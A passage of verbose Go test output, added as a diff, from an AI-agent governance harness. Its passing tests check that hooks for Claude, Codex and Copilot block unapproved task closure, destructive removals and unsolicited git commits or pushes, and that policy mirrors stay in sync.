+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/no-report
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/approved-with-remarks
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/copilot/approved-with-remarks
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/no-report
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/no-report
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/approved-with-remarks
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/opencode/approved-with-remarks
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/no-report
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/no-report
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/approved-with-remarks
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/claude/approved-with-remarks
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/no-report
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/no-report
+=== RUN   TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/approved-with-remarks
+=== PAUSE TestSessionEndGateBlocksTaskClosedAsDoneWithoutApprovedVerdict/codex/approved-with-remarks
+=== CONT  TestSyncGatesFailOnSessionEndDriftInEveryMirror
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/.agents/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/.agents/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/scripts/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/.claude/scripts/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/.codex/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/.codex/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/.github/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/.github/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/scripts/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.agents/scripts/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/scripts/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.claude/scripts/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.codex/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.codex/hooks/validate-session-end.sh
+=== RUN   TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.github/hooks/validate-session-end.sh
+=== PAUSE TestSyncGatesFailOnSessionEndDriftInEveryMirror/internal/embedded/assets/.github/hooks/validate-session-end.sh
+=== CONT  TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestSessionEndGateJSONModeEmitsNoDecisionWhenApproved (0.17s)
+=== CONT  TestPreToolDecisionIsIdenticalAcrossAllFourAgents
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando copilot...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestCodexSessionEndGateIsWiredToItsBlockingEvent1724098364/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestClaudeToolHooksCoverEveryMutatingTool4008658063/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestCodexAndCopilotToolHooksDeclareNoMatcher2664257085/001
+Modo de instalacao: copy
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Bash
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Edit
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Write
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/NotebookEdit
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/apply_patch
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Bash
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Edit
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Write
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/NotebookEdit
+=== RUN   TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/apply_patch
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestClaudeSessionEndGateIsWiredToItsBlockingEvent4163856782/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestClaudeToolHooksCoverShellTool732714013/001
+Modo de instalacao: copy
+=== RUN   TestClaudeToolHooksCoverShellTool/PreToolUse
+=== RUN   TestClaudeToolHooksCoverShellTool/PostToolUse
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestCopilotSessionEndGateSignalsRefusalOnStdout3312632122/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing791597516/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/claude
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolDecisionIsIdenticalAcrossAllFourAgents1872139439/001
+Modo de instalacao: copy
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-unconfirmed
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/go-file-confirmed-skill-missing
+=== RUN   TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+=== PAUSE TestPreToolDecisionIsIdenticalAcrossAllFourAgents/markdown-file
+=== CONT  TestClaudeRulesMirrorMatchesPreMigrationBaseline
+=== RUN   TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/governance.md
+=== PAUSE TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/governance.md
+=== RUN   TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/code-style.md
+=== PAUSE TestClaudeRulesMirrorMatchesPreMigrationBaseline/.claude/rules/code-style.md
+=== CONT  TestPoliciesSyncGateFailsOnCanonicalOnlyEdit
+=== RUN   TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/governance.md
+=== PAUSE TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/governance.md
+=== RUN   TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/code-style.md
+=== PAUSE TestPoliciesSyncGateFailsOnCanonicalOnlyEdit/.agents/policies/code-style.md
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyEdit
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/governance.md
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/governance.md
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/code-style.md
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyEdit/.claude/rules/code-style.md
+=== CONT  TestPoliciesSyncGateFailsOnMirrorOnlyDeletion
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/governance.md
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/governance.md
+=== RUN   TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/code-style.md
+=== PAUSE TestPoliciesSyncGateFailsOnMirrorOnlyDeletion/.claude/rules/code-style.md
+=== CONT  TestValidatorSuitesRunInCI
+--- PASS: TestValidatorSuitesRunInCI (0.00s)
+=== CONT  TestNoOrphanValidatorTestSuites
+--- PASS: TestNoOrphanValidatorTestSuites (0.00s)
+=== CONT  TestClaudeGovernanceHookBlockingE2E
+2026/09/18 14:44:41 runner: durable memory disabled (RF-28); legacy path preserved
+--- PASS: TestClaudeGovernanceHookBlockingE2E (0.00s)
+=== CONT  TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestClaudeSessionEndGateIsWiredToItsBlockingEvent (0.76s)
+=== CONT  TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestCodexAndCopilotToolHooksDeclareNoMatcher (0.76s)
+=== CONT  TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestClaudeToolHooksCoverEveryMutatingTool (0.77s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Bash (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Edit (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/Write (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/NotebookEdit (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PreToolUse/apply_patch (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Bash (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Edit (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/Write (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/NotebookEdit (0.00s)
+    --- PASS: TestClaudeToolHooksCoverEveryMutatingTool/PostToolUse/apply_patch (0.00s)
+=== CONT  TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestCodexSessionEndGateIsWiredToItsBlockingEvent (0.77s)
+=== CONT  TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestClaudeToolHooksCoverShellTool (0.80s)
+    --- PASS: TestClaudeToolHooksCoverShellTool/PreToolUse (0.00s)
+    --- PASS: TestClaudeToolHooksCoverShellTool/PostToolUse (0.00s)
+=== CONT  TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestCopilotSessionEndGateSignalsRefusalOnStdout (0.81s)
+=== CONT  TestPreToolHooksDelegateToCanonicalScript
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+-> Instalando claude...
+=== RUN   TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/codex
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando claude...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+=== RUN   TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/copilot
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadCo2175899921/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/codex
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfi176072338/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_status
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWith109583002/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_commit_-m_x
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed2911804603/001
+Modo de instalacao: copy
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadCo1353411949/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/claude
+=== RUN   TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/claude
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets1284443370/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/claude
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHooksDelegateToCanonicalScript74783120/001
+Modo de instalacao: copy
+--- PASS: TestPreToolHooksDelegateToCanonicalScript (0.90s)
+=== CONT  TestPreToolHookDecisionIsIdenticalAcrossAgents
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing (1.60s)
+    --- PASS: TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/claude (0.28s)
+    --- PASS: TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/codex (0.34s)
+    --- PASS: TestPreToolHookDispatchBlocksWhenSkillPrerequisiteMissing/copilot (0.31s)
+=== CONT  TestDurableMemoryCompactionSurvivesNonCollaborativeAgentE2E
+2026/09/18 14:44:42 runner: durable memory enabled (RF-28)
+=== RUN   TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/codex
+-> Instalando claude...
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/copilot
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_status
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_commit_-m_x
+=== RUN   TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/codex
+-> Instalando codex...
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/codex
+-> Instalando copilot...
+=== RUN   TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/copilot
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDecisionIsIdenticalAcrossAgents1095177887/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload-confirmed
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/empty-payload-confirmed
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-unconfirmed
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-unconfirmed
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-confirmed
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/go-file-confirmed
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/markdown-file
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/markdown-file
+=== RUN   TestPreToolHookDecisionIsIdenticalAcrossAgents/apply-patch-go
+=== PAUSE TestPreToolHookDecisionIsIdenticalAcrossAgents/apply-patch-go
+=== CONT  TestRepoCopilotGovernanceAppliesItsOwnFix
+--- PASS: TestRepoCopilotGovernanceAppliesItsOwnFix (0.01s)
+=== CONT  TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+=== RUN   TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/claude
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_commit_-m_x
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_status
+=== RUN   TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/copilot
+-> Instalando claude...
+=== RUN   TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/copilot
+-> Instalando codex...
+--- PASS: TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed (2.72s)
+    --- PASS: TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/claude (0.43s)
+    --- PASS: TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/codex (0.39s)
+    --- PASS: TestPreToolHookDispatchValidatesShellCommandTargetsWithPreloadConfirmed/copilot (0.69s)
+=== CONT  TestSessionEndHookDispatchAllowsApprovedVerdict
+=== RUN   TestSessionEndHookDispatchAllowsApprovedVerdict/copilot
+=== PAUSE TestSessionEndHookDispatchAllowsApprovedVerdict/copilot
+=== RUN   TestSessionEndHookDispatchAllowsApprovedVerdict/claude
+=== PAUSE TestSessionEndHookDispatchAllowsApprovedVerdict/claude
+=== RUN   TestSessionEndHookDispatchAllowsApprovedVerdict/codex
+=== PAUSE TestSessionEndHookDispatchAllowsApprovedVerdict/codex
+=== CONT  TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict
+=== RUN   TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/claude
+=== PAUSE TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/claude
+=== RUN   TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/codex
+=== PAUSE TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/codex
+=== RUN   TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/copilot
+=== PAUSE TestSessionEndHookDispatchBlocksActiveTaskWithoutApprovedVerdict/copilot
+=== CONT  TestToolHooksDispatchNativeApplyPatchPayload
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando copilot...
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/claude/git_push_origin_main
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/claude/git_diff
+2026/09/18 14:44:44 runner: durable memory session recorded: writes=1 redactions=0 archived=110 baton_claimed=true
+2026/09/18 14:44:44 INFO connection closed cause="peer connection closed"
+2026/09/18 14:44:44 INFO connection closed cause="io: read/write on closed pipe"
+--- PASS: TestDurableMemoryCompactionSurvivesNonCollaborativeAgentE2E (1.97s)
+=== CONT  TestPostToolHookDispatchAllowsRegularFileEdit
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+--- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed (3.08s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/codex (0.55s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/copilot (0.52s)
+    --- PASS: TestPreToolHookDispatchBlocksDestructiveRemovalEvenWithPreloadConfirmed/claude (0.99s)
+=== CONT  TestPostToolHookDispatchBlocksGovernanceFileEdit
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+--- PASS: TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets (3.11s)
+    --- PASS: TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/claude (0.53s)
+    --- PASS: TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/codex (0.56s)
+    --- PASS: TestPreToolHookDispatchAllowsShellCommandWithoutSourceTargets/copilot (0.98s)
+=== CONT  TestPreToolHookDispatchAllowsNonCodeFiles
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance673980275/001
+Modo de instalacao: copy
+Verificando skills em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance673980275/001
+Fonte: /Users/jailtonjunior/Git/orchestrator
+ai-spec dev
+
+-> Instalando claude...
+  OK                   agent-governance (2.0.0)
+  OK                   analyze-project (2.0.0)
+  OK                   bugfix (2.0.0)
+  OK                   confluence-changelog-publisher (1.0.0)
+  OK                   create-prd (2.0.0)
+  OK                   create-tasks (2.0.0)
+  OK                   create-technical-specification (2.0.0)
+  OK                   design-patterns-mandatory (1.1.0)
+  OK                   domain-modeling-production (2.0.0)
+  OK                   execute-all-tasks (2.0.0)
+  OK                   execute-task (2.0.0)
+  OK                   finalize-changelog-readme-push (1.1.0)
+  OK                   github-diff-changelog-publisher (1.0.0)
+  OK                   github-pr-comment-triage (1.0.0)
+  OK                   github-release-publication-flow (1.0.0)
+  OK                   jira-tasks (1.0.0)
+  OK                   node-implementation (1.4.0)
+  OK                   otel-grafana-dashboards (1.0.0)
+  OK                   postman-collection-generator (1.0.0)
+  OK                   prompt-enricher (1.0.0)
+  OK                   pull-request (1.0.0)
+  OK                   refactor (1.2.0)
+  OK                   review (1.4.0)
+  OK                   semantic-commit (1.1.0)
+  OK                   us-to-prd (1.0.1)
+  DESATUALIZADO        .github/hooks/governance.json (gate de encerramento do Copilot com chave obsoleta ou ausente)
+
+Resumo: 25 atualizadas, 1 desatualizadas (0 refs divergentes), 0 ausentes
+
+Execute sem --check para atualizar: ai-spec-harness upgrade /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance673980275/001 --source /Users/jailtonjunior/Git/orchestrator
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/codex/git_push_origin_main
+--- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed (3.32s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/claude (0.62s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/codex (0.77s)
+    --- PASS: TestPreToolHookDispatchAllowsGitCommitWithBothEscapesConfirmed/copilot (0.92s)
+=== CONT  TestUpgradeRepairsPreexistingObsoleteCopilotGovernance
+Ferramentas: [claude codex copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando claude...
+-> Instalando claude...
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/codex/git_diff
+-> Instalando codex...
+-> Instalando copilot...
+--- PASS: TestUpgradeCheckOnlyReportsObsoleteCopilotGovernance (1.72s)
+=== CONT  TestInstallRepairsPreexistingObsoleteCopilotGovernance
+Ferramentas: [copilot]
+Linguagens:  [node]
+
+-> Instalando skills canonicas...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando claude...
+-> Instalando codex...
+-> Instalando codex...
+-> Instalando copilot...
+-> Instalando copilot...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestToolHooksDispatchNativeApplyPatchPayload4037961401/001
+Modo de instalacao: copy
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/claude/pre
+-> Instalando copilot...
+=== RUN   TestPreToolHookDispatchBlocksUnsolicitedGitCommitAndPushEvenWithPreloadConfirmed/copilot/git_push_origin_main
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPostToolHookDispatchAllowsRegularFileEdit3921484573/001
+Modo de instalacao: copy
+=== RUN   TestPostToolHookDispatchAllowsRegularFileEdit/claude
+-> Instalando codex...
+-> Instalando copilot...
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPreToolHookDispatchAllowsNonCodeFiles910388272/001
+Modo de instalacao: copy
+=== RUN   TestPreToolHookDispatchAllowsNonCodeFiles/codex
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestPostToolHookDispatchBlocksGovernanceFileEdit2388552035/001
+Modo de instalacao: copy
+=== RUN   TestPostToolHookDispatchBlocksGovernanceFileEdit/claude
+=== RUN   TestPostToolHookDispatchAllowsRegularFileEdit/codex
+=== RUN   TestPreToolHookDispatchAllowsReadOnlyGitCommandsWithPreloadConfirmed/copilot/git_diff
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestInstallRepairsPreexistingObsoleteCopilotGovernance1381869126/001
+Modo de instalacao: copy
+=== RUN   TestPostToolHookDispatchBlocksGovernanceFileEdit/codex
+=== RUN   TestPostToolHookDispatchAllowsRegularFileEdit/copilot
+--- PASS: TestInstallRepairsPreexistingObsoleteCopilotGovernance (0.63s)
+=== CONT  TestSkillsLockGateIsGreenOnUntouchedClone
+=== RUN   TestToolHooksDispatchNativeApplyPatchPayload/codex/pre
+
+Governanca para IA instalada em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestUpgradeRepairsPreexistingObsoleteCopilotGovernance2385945228/001
+Modo de instalacao: copy
+Verificando skills em: /var/folders/hg/97c4drd559zgx8mztt_4b6fw0000gn/T/TestUpgradeRepairsPreexistingObsoleteCopilotGovernance2385945228/001
+Fonte: /Users/jailtonjunior/Git/orchestrator
+ai-spec dev
+
+  OK                   agent-governance (2.0.0)
+  OK                   analyze-project (2.0.0)
+  OK                   bugfix (2.0.0)
+  OK                   confluence-changelog-publisher (1.0.0)
+  OK                   create-prd (2.0.0)
+  OK                   create-tasks (2.0.0)
+  OK                   create-technical-specification (2.0.0)
+  OK                   design-patterns-mandatory (1.1.0)
+  OK                   domain-modeling-production (2.0.0)
+  OK                   execute-all-tasks (2.0.0)
+  OK                   execute-task (2.0.0)
+  OK                   finalize-changelog-readme-push (1.1.0)
+  OK                   github-diff-changelog-publisher (1.0.0)
+  OK                   github-pr-comment-triage (1.0.0)
+  OK                   github-release-publication-flow (1.0.0)
+  OK                   jira-tasks (1.0.0)
